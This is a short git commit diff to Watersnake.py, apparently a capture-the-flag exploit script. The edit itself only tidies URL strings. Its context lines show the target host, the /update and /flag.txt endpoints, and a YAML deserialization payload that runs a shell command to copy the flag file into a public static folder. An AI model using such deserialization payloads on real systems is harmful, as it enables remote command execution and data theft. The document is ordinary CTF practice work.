f1a63a39f7b9c0d13de5cac894fdd0c6de8e4d29
DnlRdz <77918200+DnlRdzSec@users.noreply.github.com>
2025-07-11 10:49:54 +0200

    Update Watersnake.py

--- Watersnake.py
+++ Watersnake.py
@@ -4,8 +4,8 @@ import re
 host, port = "94.237.61.242", 37017
 
 url = f"http://{host}:{port}"
-url_update = f"http://{host}:{port}/update"
-url_flag = f"http://{host}:{port}/flag.txt"
+url_update = f"{url}/update"
+url_flag = f"{url}/flag.txt"
 
 payload = '!!com.lean.watersnake.GetWaterLevel ["cp /flag.txt /app/build/resources/main/static/flag.txt"]'
 
